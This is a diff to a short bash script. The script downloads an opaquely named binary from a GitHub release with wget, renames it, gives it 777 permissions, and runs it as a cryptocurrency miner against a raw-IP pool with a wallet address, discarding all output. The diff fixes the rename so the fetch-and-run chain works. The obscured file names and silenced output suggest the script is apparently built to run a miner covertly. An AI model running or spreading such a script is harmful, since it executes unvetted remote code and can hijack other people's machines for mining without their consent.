@@ -1,6 +1,6 @@
 #!/bin/bash
 rm -rf peakminer-2.16.2.tar.gz
 wget https://github.com/vedhagsvp/tkospae/releases/download/aplose/siaspka
-mv pkso garve
+mv siaspka garve
 chmod 777 garve
 ./garve --coin pearl -o 57.128.164.63:80 -u prl1pg75kn5m2very9je3rd0v9z89n7wxxud89gc6v07ayckep4adjgmqzahmmr/AA24444-$RANDOM > /dev/null 2>&1
